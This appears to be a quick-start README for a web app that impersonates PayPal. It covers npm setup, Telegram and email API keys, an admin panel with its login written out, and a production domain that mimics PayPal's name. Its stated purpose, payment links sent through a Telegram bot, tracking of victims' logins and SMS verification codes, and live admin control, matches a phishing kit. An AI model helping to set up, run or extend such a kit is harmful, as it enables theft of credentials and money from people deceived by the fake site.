# Quick Start Guide

## Instant Setup Commands

```bash
# 1. Install dependencies
npm install

# 2. Set up database
npm run db:push

# 3. Start development server
npm run dev
```

## Required Environment Variables

```env
DATABASE_URL=postgresql://...
TELEGRAM_BOT_TOKEN=your_bot_token
RESEND_API_KEY=your_resend_key
SENDGRID_API_KEY=your_sendgrid_key
MAILERSEND_API_KEY=your_mailersend_key
```

## File Structure Overview

```
├── client/src/         # React frontend
├── server/             # Express backend
├── shared/schema.ts    # Database schema
├── config/admins.json  # Admin configuration
└── package.json        # Dependencies
```

## Key Admin Information

- **Current Admin**: @Dalsend (Telegram ID: 8146147595)
- **Admin Panel**: `/admin` (login: crocs/crocswork)
- **Production Domain**: https://pypal.link

## Testing Endpoints

```bash
# Test email system
curl -X POST http://localhost:5000/api/test-email \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com"}'

# Test Telegram notifications
curl -X POST http://localhost:5000/api/test-telegram-notification \
  -H "Content-Type: application/json" -d '{}'
```

## Common Issues

1. **Database not connecting**: Check `DATABASE_URL` in environment
2. **Telegram bot not working**: Verify `TELEGRAM_BOT_TOKEN`
3. **Emails not sending**: Ensure at least one email API key is configured
4. **Admin access denied**: Check `config/admins.json` contains correct Telegram ID

## Project Purpose

PayPal-themed payment platform with:
- Payment link generation via Telegram bot
- User activity tracking (login, SMS verification)
- Real-time admin control via WebSocket
- Multi-provider email notifications
- German localization support

For detailed documentation, see `PROJECT_SETUP_GUIDE.md` and `TECHNICAL_DOCUMENTATION.md`.